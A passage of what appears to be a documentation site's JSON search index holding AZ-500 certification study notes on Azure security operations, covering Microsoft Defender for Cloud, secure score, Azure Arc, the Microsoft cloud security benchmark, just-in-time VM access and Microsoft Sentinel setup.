protections:</p> <ul> <li>Defender for Cloud's CSPM features\u00a0extend to your AWS resources. This agentless plan assesses your AWS resources according to AWS-specific security recommendations, and these are included in your secure score. The resources will also be assessed for compliance with built-in standards specific to\u00a0AWS (AWS Center for Internet Security (CIS),\u00a0AWS Payment Card Industry (PCI) Data Security Standards (DSS), and\u00a0AWS Foundational Security Best Practices). Defender for Cloud's asset inventory page is a multicloud enabled feature helping you manage your AWS resources alongside your Azure resources.</li> <li>Microsoft Defender for Kubernetes extends\u00a0its container threat detection and advanced defenses to your Amazon Elastic Kubernetes Service (EKS) Linux clusters.</li> <li>Microsoft Defender for Servers\u00a0brings threat detection and advanced defenses to your Windows and Linux Elastic Compute Cloud 2 (EC2) instances. This plan includes the integrated license for Microsoft Defender for Endpoint, security baselines, and OS level assessments, vulnerability assessment scanning, adaptive application controls (AAC), file integrity monitoring (FIM), and more.</li> </ul> <p>Defender for Cloud includes vulnerability assessment solutions for\u00a0virtual machines, container registries, and\u00a0SQL servers\u00a0as part of the enhanced security features. Some of the scanners are powered by Qualys. But you don't need a Qualys license or even a Qualys account - everything's handled seamlessly inside Defender for Cloud.</p> <p>Microsoft Defender for Servers includes automatic, native integration with Microsoft Defender for Endpoint. With this integration enabled, you'll have access to the vulnerability findings from Microsoft Defender Vulnerability Management.</p> <p>The list of recommendations is enabled and supported by the Microsoft cloud security benchmark. This Microsoft-authored benchmark, based on common compliance frameworks, began with Azure and now provides a set of guidelines for security and compliance best practices for multiple cloud environments. In this way, Defender for Cloud enables you not just to set security policies but to\u00a0apply secure configuration standards across your resources.</p> <p>Microsoft Defender for the\u00a0Internet of Things (IoT)\u00a0is a separate product.</p> <p>The\u00a0Defender plans\u00a0of Microsoft Defender for Cloud offer comprehensive defenses for the\u00a0compute,\u00a0data, and\u00a0service layers\u00a0of your environment:</p> <ul> <li>Microsoft Defender for Servers</li> <li>Microsoft Defender for Storage</li> <li>Microsoft Defender for Structured Query Language (SQL)</li> <li>Microsoft Defender for Containers</li> <li>Microsoft Defender for App Service</li> <li>Microsoft Defender for Key Vault</li> <li>Microsoft Defender for Resource Manager</li> <li>Microsoft Defender for Domain Name System (DNS)</li> <li>Microsoft Defender for open-source relational databases</li> <li>Microsoft Defender for Azure Cosmos Database (DB)</li> <li>Defender Cloud Security Posture Management (CSPM)<ul> <li>Security governance and regulatory compliance</li> <li>Cloud security explorer</li> <li>Attack path analysis</li> <li>Agentless scanning for machines</li> </ul> </li> <li>Defender for DevOps</li> <li>Security alerts\u00a0- When Defender for Cloud\u00a0detects a threat\u00a0in any area of your environment, it\u00a0generates a security alert. These alerts describe details of the\u00a0affected resources,\u00a0suggested remediation steps, and in some cases, an\u00a0option to trigger a logic app in response. Whether an alert is generated by Defender for Cloud or received by Defender for Cloud from an integrated security product, you can export it. To export your alerts to Microsoft Sentinel, any third-party Security information and event management (SIEM), or any other external tool, follow the instructions in Stream alerts to a SIEM, Security orchestration, automation and response (SOAR), or IT Service Management solution. Defender for Cloud's threat protection includes\u00a0fusion kill-chain analysis, which automatically correlates alerts in your environment based on cyber kill-chain analysis, to help you better understand the full story of an attack campaign, where it started, and what kind of impact it had on your resources.\u00a0Defender for Cloud's supported kill chain intents are based on version 9 of the MITRE ATT&amp;CK matrix.</li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-4-security-operations/#23-cloud-security-posture-management-cspm-remediate-security-issues-and-watch-your-security-posture-improve-security-posture-tab-regulatory-compliance-tab","title":"2.3. Cloud Security Posture Management (CSPM) - Remediate security issues and watch your security posture improve - Security posture tab + Regulatory compliance tab","text":"<p>Defender for Cloud continually assesses your resources, subscriptions, and organization for security issues and shows your security posture in the secure score, an aggregated score of the security findings that tells you, at a glance, your current security situation: the higher the score, the lower the identified risk level.</p> <ul> <li>Generates a secure score\u00a0for your subscriptions based on an assessment of your connected resources compared with the guidance in the\u00a0Microsoft cloud security benchmark.</li> <li>Provides hardening recommendations\u00a0based on any\u00a0identified security misconfigurations\u00a0and\u00a0weaknesses. </li> <li>Analyzes and secure's your attack paths\u00a0through the cloud security graph, which is a graph-based context engine that exists within Defender for Cloud. The cloud security graph collects data from your multicloud environment and other data sources. </li> <li>Attack path analysis is a\u00a0graph-based algorithm that scans the cloud security graph. The\u00a0scans expose exploitable paths attackers may use to breach your environment to reach your high-impact assets.</li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-4-security-operations/#24-workload-protections-tab","title":"2.4. Workload protections tab","text":"<p>Defender for Cloud offers security alerts that are powered by Microsoft Threat Intelligence. It also includes a range of advanced, intelligent protections for your workloads. The workload protections are provided through Microsoft Defender plans specific to the types of resources in your subscriptions.</p> <p>The Cloud workload dashboard includes the following sections:</p> <ol> <li>Microsoft Defender for Cloud coverage\u00a0- Here you can see the resources types in your subscription that are eligible for protection by Defender for Cloud. Wherever relevant, you can upgrade here as well. If you want to upgrade all possible eligible resources, select\u00a0Upgrade all.</li> <li>Security alerts\u00a0- When Defender for Cloud detects a threat in any area of your environment, it generates an alert. These alerts describe details of the affected resources, suggested remediation steps, and in some cases an option to\u00a0trigger a logic app\u00a0in response. Selecting anywhere in this graph opens the Security alerts page.</li> <li>Advanced protection\u00a0- Defender for Cloud includes many advanced threat protection capabilities for virtual machines,\u00a0Structured Query Language (SQL)\u00a0databases, containers, web applications, your network, and more. In this advanced protection section, you can see the status of the resources in your selected subscriptions for each of these protections. Select any of them to go directly to the configuration area for that protection type.</li> <li>Insights\u00a0- This rolling pane of news, suggested reading, and high priority alerts gives Defender for Cloud's insights into pressing security matters that are relevant to you and your subscription. Whether it's a list of high severity\u00a0Common Vulnerabilities and Exposures (CVEs)\u00a0discovered on your VMs by a vulnerability analysis tool, or a new blog post by a member of the Defender for Cloud team, you'll find it here in the Insights panel.</li> </ol>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-4-security-operations/#25-deploy-microsoft-defender-for-cloud","title":"2.5. Deploy Microsoft Defender for Cloud","text":"<p>Defender for Cloud provides foundational\u00a0cloud security and posture management (CSPM)\u00a0features by default. </p> <p>Defender for cloud\u00a0offers foundational multicloud CSPM capabilities for free. The foundational CSPM includes a\u00a0secure score,\u00a0security policy and basic recommendations, and\u00a0network security assessment\u00a0to help you\u00a0protect your Azure resources.</p> <p>The optional Defender CSPM plan provides advanced posture management capabilities such as\u00a0Attack path analysis,\u00a0Cloud security explorer,\u00a0advanced threat hunting,\u00a0security governance capabilities, and also tools to assess your security compliance with a wide range of benchmarks, regulatory standards, and any custom security policies required in your organization, industry, or region.</p> <p></p> <p>When you enabled Defender plans on an entire Azure subscription, the protections are inherited by all resources in the subscription. When you enable the enhanced security features (paid), Defender for Cloud can provide unified security management and threat protection across your hybrid cloud workloads, including:</p> <ul> <li> <p>Microsoft Defender for Endpoint\u00a0- Microsoft Defender for Servers includes Microsoft Defender for Endpoint for comprehensive endpoint detection and response (EDR).</p> </li> <li> <p>Vulnerability assessment for virtual machines, container registries, and SQL resources </p> </li> <li> <p>Multicloud security\u00a0- Connect your accounts from Amazon Web Services (AWS) and Google Cloud Platform (GCP) to protect resources and workloads on those platforms with a range of Microsoft Defender for Cloud security features.</p> </li> <li> <p>Hybrid security\u00a0\u2013 Get a unified view of security across all of your on-premises and cloud workloads. </p> </li> <li> <p>Threat protection alerts\u00a0- Advanced behavioral analytics and the Microsoft Intelligent Security Graph provide an edge over evolving cyber-attacks. Built-in behavioral analytics and machine learning can identify attacks and zero-day exploits. Monitor networks, machines, data stores (SQL servers hosted inside and outside Azure, Azure SQL databases, Azure SQL Managed Instance, and Azure Storage), and cloud services for incoming attacks and post-breach activity. Streamline investigation with interactive tools and contextual threat intelligence.</p> </li> <li> <p>Track compliance with a range of standards\u00a0- Defender for Cloud continuously assesses your hybrid cloud environment to analyze the risk factors according to the controls and best practices in the Microsoft cloud security benchmark. When you enable enhanced security features, you can apply a range of other industry standards, regulatory standards, and benchmarks according to your organization's needs. Add standards and track your compliance with them from the regulatory compliance dashboard.</p> </li> <li> <p>Access and application controls\u00a0- Block malware and other unwanted applications by applying machine learning-powered recommendations adapted to your specific workloads to create allowlists and blocklists. Reduce the network attack surface with just-in-time, controlled access to management ports on Azure VMs. Access and application control drastically reduce exposure to brute force and other network attacks.</p> </li> <li> <p>Container security features\u00a0- Benefit from vulnerability management and real-time threat protection in your containerized environments. Charges are based on the number of unique container images pushed to your connected registry. After an image has been scanned once, you won't be charged for it again unless it's modified and pushed once more.</p> </li> <li> <p>Breadth threat protection for resources connected to Azure\u00a0- Cloud-native threat protection for the Azure services common to all of your resources: Azure Resource Manager, Azure Domain Name System (DNS), Azure network layer, and Azure Key Vault. Defender for Cloud has unique visibility into the Azure management layer and the Azure DNS layer and can therefore protect cloud resources that are connected to those layers.</p> </li> </ul> <p>Manage your Cloud Security Posture Management (CSPM)\u00a0- CSPM offers you the ability to remediate security issues and review your security posture through the tools provided. These tools include:</p> <ul> <li>Security governance and regulatory compliance<ul> <li>What is Security governance and regulatory compliance? Security governance and regulatory compliance refer to the policies and processes which organizations have in place to ensure that they comply with laws, rules, and regulations put in place by external bodies (government) that control activity in a given jurisdiction. Defender for Cloud allows you to view your regulatory compliance through the regulatory compliance dashboard. Defender for Cloud continuously assesses your hybrid cloud environment to analyze the risk factors according to the controls and best practices in the standards you've applied to your subscriptions. The dashboard reflects the status of your compliance with these standards.</li> </ul> </li> <li>Cloud security graph<ul> <li>What is a cloud security graph? The cloud security graph is a\u00a0graph-based context engine\u00a0that exists within Defender for Cloud. The cloud security graph collects data from your multicloud environment and other data sources.\u00a0For example, the cloud assets inventory, connections and lateral movement possibilities between resources, exposure to the internet, permissions, network connections, vulnerabilities, and more. The data collected is then used to build a graph representing your multicloud environment. Defender for Cloud then uses the generated graph to perform an attack path analysis and find the issues with the highest risk that exist within your environment. You can also query the graph using the cloud security explorer.</li> </ul> </li> <li>Attack path analysis<ul> <li>What is Attack path analysis? Attack path analysis helps you to\u00a0address the security issues that pose immediate threats with the greatest potential of being exploited in your environment. Defender for Cloud analyzes which security issues are part of potential attack paths that attackers could use to breach your environment. It also highlights the security recommendations that need to be resolved in order to mitigate the issue.</li> </ul> </li> <li>Agentless scanning for machines<ul> <li>What is agentless scanning for machines? Microsoft Defender for Cloud maximizes coverage on OS posture issues and extends beyond the reach of agent-based assessments. With agentless scanning for VMs, you can get frictionless, wide, and instant visibility on actionable posture issues without installed agents, network connectivity requirements, or machine performance impact.\u00a0Agentless scanning for VMs provides vulnerability assessment and software inventory\u00a0powered by Defender vulnerability management in Azure and Amazon AWS environments. Agentless scanning is available in Defender Cloud Security Posture Management (CSPM) and Defender for Servers.</li> </ul> </li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-4-security-operations/#26-azure-arc","title":"2.6. Azure Arc","text":"<p>Azure Arc provides a centralized, unified way to:</p> <ul> <li>Manage your entire environment together by projecting your existing non-Azure and/or on-premises resources into Azure Resource Manager.</li> <li>Manage virtual machines, Kubernetes clusters, and databases as if they are running in Azure.</li> <li>Use familiar Azure services and management capabilities, regardless of where they live.</li> <li>Continue using traditional IT operations (ITOps) while introducing DevOps practices to support new cloud-native patterns in your environment.</li> <li>Configure custom locations as an abstraction layer on top of Azure Arc-enabled Kubernetes clusters and cluster extensions.</li> </ul> <p>Currently, Azure Arc allows you to manage the following resource types hosted outside of Azure:</p> <ul> <li>Servers: Manage Windows and Linux physical servers and virtual machines hosted outside of Azure.</li> <li>Kubernetes clusters: Attach and configure Kubernetes clusters running anywhere with multiple supported distributions.</li> <li>Azure data services: Run Azure data services on-premises, at the edge, and in public clouds using Kubernetes and the infrastructure of your choice. SQL Managed Instance and PostgreSQL server (preview) services are currently available.</li> <li>SQL Server: Extend Azure services to SQL Server instances hosted outside of Azure.</li> <li>Virtual machines (preview): Provision, resize, delete, and manage virtual machines based on VMware vSphere or Azure Stack\u00a0hyper-converged infrastructure (HCI)\u00a0and enable VM self-service through role-based access.</li> </ul> <p></p> <p>Some of the key scenarios that Azure Arc supports are:</p> <ul> <li>Implement consistent inventory, management, governance, and security for servers across your environment.</li> <li>Configure Azure VM extensions to use Azure management services to monitor, secure, and update your servers.</li> <li>Manage and govern Kubernetes clusters at scale.</li> <li>Use GitOps to deploy configuration across one or more clusters from Git repositories.</li> <li>Zero-touch compliance and configuration for Kubernetes clusters using Azure Policy.</li> <li>Run Azure data services on any Kubernetes environment as if it runs in Azure (specifically Azure SQL Managed Instance and Azure Database for PostgreSQL server, with benefits such as upgrades, updates, security, and monitoring). Use elastic scale and apply updates without any application downtime, even without continuous connection to Azure.</li> <li>Create custom locations on top of your Azure Arc-enabled Kubernetes clusters, using them as target locations for deploying Azure services instances. Deploy your Azure service cluster extensions for Azure Arc-enabled data services, App services on Azure Arc (including web, function, and logic apps), and Event Grid on Kubernetes.</li> <li>Perform virtual machine lifecycle and management operations for VMware vSphere and Azure Stack\u00a0hyper-converged infrastructure (HCI)\u00a0environments.</li> <li>A unified experience viewing your Azure Arc-enabled resources, whether you are using the Azure portal, the Azure CLI, Azure PowerShell, or Azure REST API.</li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-4-security-operations/#27-microsoft-cloud-security-benchmark","title":"2.7. Microsoft cloud security benchmark","text":"<p>Located at  Defender &gt; Regulatory compliance</p> <p>The\u00a0Microsoft cloud security benchmark (MCSB)\u00a0provides\u00a0prescriptive best practices\u00a0and\u00a0recommendations\u00a0to help improve the security of workloads, data, and services on Azure and your multi-cloud environment, focusing on cloud-centric control areas with input from a set of holistic Microsoft and industry security guidance that includes:</p> <ul> <li>Cloud Adoption Framework: Guidance on\u00a0security, including\u00a0strategy,\u00a0roles\u00a0and\u00a0responsibilities,\u00a0Azure Top 10 Security Best Practices, and\u00a0reference implementation.</li> <li>Azure Well-Architected Framework: Guidance on securing your workloads on Azure.</li> <li>The Chief Information Security Officer (CISO) Workshop: Program guidance and reference strategies to accelerate security modernization using Zero Trust principles.</li> <li>Other industry and cloud service provider's security best practice standards and framework: Examples include the Amazon Web Services (AWS) Well-Architected Framework, Center for Internet Security (CIS) Controls, National Institute of Standards and Technology (NIST), and Payment Card Industry Data Security Standard (PCI-DSS).</li> </ul> Control Domains Description Network security (NS) Network Security\u00a0covers controls to secure and protect networks, including securing virtual networks, establishing private connections, preventing and mitigating external attacks, and securing Domain Name System (DNS). Identity Management (IM) Identity Management\u00a0covers controls to establish a secure identity and access controls using identity and access management systems, including the use of single sign-on, strong authentications, managed identities (and service principals) for applications, conditional access, and account anomalies monitoring. Privileged Access (PA) Privileged Access\u00a0covers controls to protect privileged access to your tenant and resources, including a range of controls to protect your administrative model, administrative accounts, and privileged access workstations against deliberate and inadvertent risk. Data Protection (DP) Data Protection\u00a0covers control of data protection at rest, in transit, and via authorized access mechanisms, including discover, classify, protect, and monitoring sensitive data assets using access control, encryption, key management, and certificate management. Asset Management (AM) Asset Management\u00a0covers controls to ensure security visibility and governance over your resources, including recommendations on permissions for security personnel, security access to asset inventory and managing approvals for services and resources (inventory,\u00a0track, and\u00a0correct). Logging and Threat Detection (LT) Logging and Threat Detection\u00a0covers controls for detecting threats on the cloud and enabling, collecting, and storing audit logs for cloud services, including enabling detection, investigation, and remediation processes with controls to generate high-quality alerts with native threat detection in cloud services; it also includes collecting logs with a cloud monitoring service, centralizing security analysis with a\u00a0security event management (SEM), time synchronization, and log retention. Incident Response (IR) Incident Response\u00a0covers controls in the incident response life cycle - preparation, detection and analysis, containment, and post-incident activities, including using Azure services (such as Microsoft Defender for Cloud and Sentinel) and/or other cloud services to automate the incident response process. Posture and Vulnerability Management (PV) Posture and Vulnerability Management\u00a0focuses on controls for assessing and improving the cloud security posture, including vulnerability scanning, penetration testing, and remediation, as well as security configuration tracking, reporting, and correction in cloud resources. Endpoint Security (ES) Endpoint Security\u00a0covers controls in endpoint detection and response, including the use of endpoint detection and response (EDR) and anti-malware service for endpoints in cloud environments. Backup and Recovery (BR) Backup and Recovery\u00a0covers controls to ensure that data and configuration backups at the different service tiers are performed, validated, and protected. DevOps Security (DS) DevOps Security\u00a0covers the controls related to the security engineering and operations in the DevOps processes, including deployment of critical security checks (such as static application security testing and vulnerability management) prior to the deployment phase to ensure the security throughout the DevOps process; it also includes common topics such as threat modeling and software supply security. Governance and Strategy (GS) Governance and Strategy\u00a0provides guidance for ensuring a coherent security strategy and documented governance approach to guide and sustain security assurance, including establishing roles and responsibilities for the different cloud security functions, unified technical strategy, and supporting policies and standards.","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-4-security-operations/#28-security-policies-and-defender-for-cloud-initiatives","title":"2.8. Security policies and Defender for Cloud initiatives","text":"<p>Like security policies, Defender for Cloud initiatives are also created in Azure Policy. You can use\u00a0Azure Policy\u00a0to manage your policies, build initiatives, and assign initiatives to multiple subscriptions or entire management groups.</p> <p>The default initiative automatically assigned to every subscription in Microsoft Defender for Cloud is the Microsoft cloud security benchmark.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-4-security-operations/#29-view-and-edit-security-policies","title":"2.9. View and edit security policies","text":"<p>There are two specific roles for Defender for Cloud:</p> <ol> <li>Security Administrator: Has the same view rights as security reader. Can also update the security policy and dismiss alerts.</li> <li>Security reader: Has rights to view Defender for Cloud items such as recommendations, alerts, policy, and health. Can't make changes.</li> </ol> <p>You can edit security policies through the\u00a0Azure Policy portal\u00a0via\u00a0Representational State Transfer Application Programming Interface (REST API)\u00a0or using\u00a0Windows PowerShell.</p> <p>The Security Policy screen reflects the action taken by the policies assigned to the subscription or management group you selected.</p> <ul> <li>Use the links at the top to open a policy assignment that applies to the subscription or management group. These links let you access the assignment and edit or disable the policy.\u00a0For example, if you see that a particular policy assignment is effectively denying endpoint protection, use the link to edit or disable the policy.</li> <li>In the list of policies, you can see the effective application of the policy on your subscription or management group. The settings of each policy that apply to the scope are taken into consideration, and the cumulative outcome of actions taken by the policy is shown.\u00a0For example, if one assignment of the policy is disabled, but in another, it's set to\u00a0AuditIfNotExist, then the cumulative effect applies\u00a0AuditIfNotExist. The more active effect always takes precedence.</li> <li>The policies' effect can be:\u00a0Append,\u00a0Audit,\u00a0AuditIfNotExists,\u00a0Deny,\u00a0DeployIfNotExists, or\u00a0Disabled.</li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-4-security-operations/#210-microsoft-defender-for-cloud-recommendations","title":"2.10. Microsoft Defender for Cloud recommendations","text":"<p>In practice, it works like this:</p> <ol> <li> <p>Microsoft Cloud security benchmark is an\u00a0initiative\u00a0that contains requirements.</p> <p>For example, Azure Storage accounts must restrict network access to reduce their attack surface.</p> </li> <li> <p>The initiative includes multiple\u00a0policies, each requiring a specific resource type. These policies enforce the requirements in the initiative.</p> <p>To continue the example, the storage requirement is enforced with the policy \"Storage accounts should restrict network access using virtual network rules.\"</p> </li> <li> <p>Microsoft Defender for Cloud continually assesses your connected subscriptions. If it finds a resource that doesn't satisfy a policy, it displays a\u00a0recommendation\u00a0to fix that situation and harden the security of resources that aren't meeting your security requirements.</p> <p>For example, if an Azure Storage account on your protected subscriptions isn't protected with virtual network rules, you see the recommendation to harden those resources.</p> </li> </ol> <p>So, (1)\u00a0an initiative includes\u00a0(2)\u00a0policies that generate\u00a0(3)\u00a0environment-specific recommendations.</p> <p>Defender for Cloud continually assesses your cross-cloud resources for security issues. It then\u00a0aggregates all the findings into a single score\u00a0so that you can tell, at a glance, your current security situation: the\u00a0higher the score, the\u00a0lower the identified risk level.</p> <p>In the Azure mobile app, the secure score is shown as a percentage value, and you can tap the secure score to see the details that explain the score:</p> <p>To increase your security, review Defender for Cloud's\u00a0recommendations page\u00a0and remediate the recommendation by implementing the remediation instructions for each issue.\u00a0Recommendations are grouped into security controls. Each control is a\u00a0logical group of related security recommendations\u00a0and\u00a0reflects your vulnerable attack surfaces. Your score only improves when you\u00a0remediate all\u00a0of the recommendations for a\u00a0single resource within a control.</p> <ul> <li> <p>Insights - Gives you extra details for each recommendation, such as:</p> <ul> <li>Preview recommendation\u00a0- This recommendation won't affect your secure score until\u00a0general availability (GA).</li> <li>Fix\u00a0- From within the recommendation details page, you can use 'Fix' to resolve this issue.</li> <li>Enforce\u00a0- From within the recommendation details page, you can automatically deploy a policy to fix this issue whenever someone creates a non-compliant resource.</li> <li>Deny\u00a0- From within the recommendation details page, you can prevent new resources from being created with this issue.</li> </ul> </li> </ul> <p>Which recommendations are included in the secure score calculations?</p> <ul> <li>Only built-in recommendations have an impact on the secure score.</li> <li>Recommendations flagged as Preview aren't included in the calculations of your secure score. They should still be remediated wherever possible so that when the preview period ends, they'll contribute towards your score.</li> <li>Preview recommendations are marked with:\u00a0</li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-4-security-operations/#211-brute-force-attacks","title":"2.11. Brute force attacks","text":"<p>To counteract brute-force attacks, you can take multiple measures such as:</p> <ul> <li> <p>Disable the public IP address and use one of these connection methods:</p> <ul> <li>Use a point-to-site virtual private network (VPN)</li> <li>Create a site-to-site VPN</li> <li>Use Azure ExpressRoute to create secure links from your on-premises network to Azure.</li> <li>Require two-factor authentication</li> </ul> </li> <li> <p>Increase password length and complexity</p> </li> <li> <p>Limit login attempts</p> </li> <li> <p>Implement Captcha</p> <ul> <li>About CAPTCHAs\u00a0- Any time you let people register on your site or even enter a name and URL (like for a blog comment), you might get a flood of fake names. These are often left by automated programs (bots) that try to leave URLs on every website they can find. (A common motivation is to post the URLs of products for sale.) You can help make sure that a user is a real person and not a computer program by using a\u00a0CAPTCHA\u00a0to validate users when they register or otherwise enter their name and site.</li> <li>CAPTCHA stands for\u00a0Completely Automated Public Turing test to tell Computers and Humans Apart. A CAPTCHA is a\u00a0challenge-response\u00a0test in which the user is asked to do something that is easy for a person to do but hard for an automated program to do. The most common type of CAPTCHA is one where you see distorted letters and are asked to type them. (The distortion is supposed to make it hard for bots to decipher the letters.)</li> <li>Limit the amount of time that the ports are open.</li> </ul> </li> </ul>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-4-security-operations/#just-in-time-vm-access","title":"Just-in-time VM access","text":"<p>Threat actors actively hunt accessible machines with open management ports, like\u00a0remote desktop protocol (RDP)\u00a0or\u00a0secure shell protocol (SSH). All of your virtual machines are potential targets for an attack. When a VM is successfully compromised, it's used as the entry point to attack further resources within your environment.</p> <p></p> <p>The diagram shows the logic Defender for Cloud applies when deciding how to categorize your supported VM. When Defender for Cloud finds a machine that can benefit from JIT, it adds that machine to the recommendation's Unhealthy resources tab.</p> <p>Just-in-time (JIT) virtual machine (VM) access is used to lock down inbound traffic to your Azure VMs, reducing exposure to attacks while providing easy access to connect to VMs when needed. When you enable JIT VM Access for your VMs, you next create a policy that determines the ports to help protect, how long ports should remain open, and the approved IP addresses that can access these ports. The policy helps you stay in control of what users can do when they request access. Requests are logged in the Azure activity log, so you can easily monitor and audit access. The policy will also help you quickly identify the existing VMs that have JIT VM Access enabled and the VMs where JIT VM Access is recommended.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-4-security-operations/#3-configure-and-monitor-microsoft-sentinel","title":"3. Configure and monitor Microsoft Sentinel","text":"","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-4-security-operations/#31-what-is-microsoft-sentinel","title":"3.1. What is Microsoft Sentinel","text":"<p>Microsoft Sentinel is a scalable, cloud-native, security information event management (SIEM) and security orchestration automated response (SOAR) solution. Microsoft Sentinel delivers intelligent security analytics and threat intelligence across the enterprise, providing a single solution for alert detection, threat visibility, proactive hunting, and threat response.</p> <p>Think of Microsoft Sentinel as the first\u00a0SIEM-as-a-service\u00a0that brings the power of the cloud and artificial intelligence to help security operations teams efficiently identify and stop cyber-attacks before they cause harm.</p> <p>Microsoft Sentinel integrates with Microsoft 365 solution and correlates millions of signals from different products such as: - Azure Identity Protection,  - Microsoft Cloud App Security,  - and soon Azure Advanced Threat Protection, Windows Advanced Threat Protection, M365 Advanced Threat Protection, Intune, and Azure Information Protection.</p> <p>It enables the following services:</p> <p>It enables the following services:</p> <ul> <li>Collect data at cloud scale\u00a0across all users, devices, applications, and infrastructure, both on-premises and in multiple clouds.</li> <li>Detect previously undetected threats, and minimize false positives using Microsoft's analytics and unparalleled threat intelligence.</li> <li>Investigate threats with artificial intelligence, and hunt for suspicious activities at scale, tapping into years of cyber security work at Microsoft.</li> <li>Respond to incidents rapidly\u00a0with built-in orchestration and automation of common tasks.</li> </ul> <p></p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-4-security-operations/#configure-data-connections-to-sentinel","title":"Configure data connections to Sentinel","text":"<p>To onboard Microsoft Sentinel, these are the global prerequisites:</p> <ul> <li>Active Azure Subscription</li> <li>Log Analytics workspace.</li> <li>To enable Microsoft Sentinel, you need contributor permissions to the subscription in which the Microsoft Sentinel workspace resides.</li> <li>To use Microsoft Sentinel, you need either contributor or reader permissions on the resource group that the workspace belongs to.</li> <li>Additional permissions may be needed to connect specific data sources.</li> <li>Microsoft Sentinel is a paid service.</li> </ul> <p>Having those,  to onboard Microsoft Sentinel, you first need to connect to your security sources.</p> <p>Microsoft Sentinel comes with a number of connectors for Microsoft solutions, and additionally  there are built-in connectors to the broader security ecosystem for non-Microsoft solutions.  You can also use common event format, Syslog or REST-API to connect your data sources with Microsoft Sentinel as well.</p> <p>The following data connection methods are supported by Microsoft Sentinel:</p> <ul> <li>Service to service integration: Some services are connected natively, such as AWS and Microsoft services, these services leverage the Azure foundation for out-of-the-box integration, the following solutions can be connected in a few clicks:</li> <li>Amazon Web Services - CloudTrail</li> <li>Azure Activity</li> <li>Microsoft Entra audit logs and sign-ins</li> <li>Microsoft Entra ID Protection</li> <li>Azure Advanced Threat Protection</li> <li>Azure Information Protection</li> <li>Microsoft Defender for Cloud</li> <li>Cloud App Security</li> <li>Domain name server</li> <li>Microsoft 365</li> <li>Microsoft Defender ATP</li> <li>Microsoft web application firewall</li> <li>Windows firewall</li> <li>Windows security events</li> </ul> <p>External solutions</p> <ul> <li>API: Some data sources are connected using APIs that are provided by the connected data source. Typically, most security technologies provide a set of APIs through which event logs can be retrieved. The APIs connect to Microsoft Sentinel and gather specific data types and send them to Azure Log Analytics</li> <li>Agent: The Microsoft Sentinel agent, which is based on the Log Analytics agent, converts CEF formatted logs into a format that can be ingested by Log Analytics. Depending on the appliance type, the agent is installed either directly on the appliance, or on a dedicated Linux server. To connect your external appliance to Microsoft Sentinel, the agent must be deployed on a dedicated machine (VM or on-premises) to support the communication between the appliance and Microsoft Sentinel. You can deploy the agent automatically or manually. Automatic deployment is only available if your dedicated machine is a new VM you are creating in Azure. Alternatively, you can deploy the agent manually on an existing Azure VM, on a VM in another cloud, or on an on-premises machine.</li> </ul> <p></p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-4-security-operations/#32-create-workbooks-to-monitor-sentinel-data","title":"3.2. Create workbooks to monitor Sentinel data","text":"<p>After onboarding to Microsoft Sentinel, monitor your data using the Azure Monitor workbooks integration.</p> <p>After you connect your data sources to Microsoft Sentinel, you can monitor the data using the Microsoft Sentinel integration with Azure Monitor Workbooks, which provides versatility in creating custom workbooks. While Workbooks are displayed differently in Microsoft Sentinel, it may be helpful for you to determine how to create interactive reports with Azure Monitor Workbooks. Microsoft Sentinel allows you to create custom workbooks across your data and comes with built-in workbook templates to quickly gain insights across your data as soon as you connect a data source.</p> <p>Workbooks are intended for\u00a0Security operations center (SOC)\u00a0engineers and analysts of all tiers to visualize data. Workbooks are best used for high-level views of Microsoft Sentinel data and don't require coding knowledge. </p> <p>You can't integrate workbooks with external data.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-4-security-operations/#33-enable-rules-to-create-incidents","title":"3.3. Enable rules to create incidents","text":"<p>To help you reduce noise and minimize the number of alerts you have to review and investigate, Microsoft Sentinel uses analytics to correlate alerts into incidents.</p> <p>Incidents are groups of related alerts that indicate an actionable possible threat you can investigate and resolve.</p> <p>You can use the built-in correlation rules as-is or as a starting point to build your own.</p> <p>Microsoft Sentinel also provides machine learning rules to map your network behavior and then look for anomalies across your resources.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-4-security-operations/#34-configure-playbooks","title":"3.4. Configure playbooks","text":"<p>Automate your common tasks and simplify security orchestration with playbooks that integrate with Azure services and your existing tools.</p> <p>To build playbooks with Azure Logic Apps, you can choose from a growing gallery of built-in playbooks. These include 200 or more connectors for services such as Azure functions. The connectors allow you to apply any custom logic in code like:  </p> <ul> <li>ServiceNow  </li> <li>Jira</li> <li>Zendesk</li> <li>HTTP requests</li> <li>Microsoft Teams</li> <li>Slack</li> <li>Microsoft Entra ID</li> <li>Microsoft Defender for Endpoint</li> <li>Microsoft Defender for Cloud Apps</li> </ul> <p>For example, if you use the ServiceNow ticketing system, use Azure Logic Apps to automate your workflows and open a ticket in ServiceNow each time a particular alert or incident is generated.</p> <p></p> <p>Playbooks are intended for\u00a0Security operations center (SOC)\u00a0engineers and analysts of all tiers to\u00a0automate\u00a0and\u00a0simplify tasks,\u00a0including data ingestion,\u00a0enrichment,\u00a0investigation, and\u00a0remediation. Playbooks work best with single, repeatable tasks and don't require coding knowledge. Playbooks aren't suitable for ad-hoc or complex task chains or for documenting and sharing evidence.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-4-security-operations/#35-hunt-and-investigate-potential-breaches","title":"3.5. Hunt and investigate potential 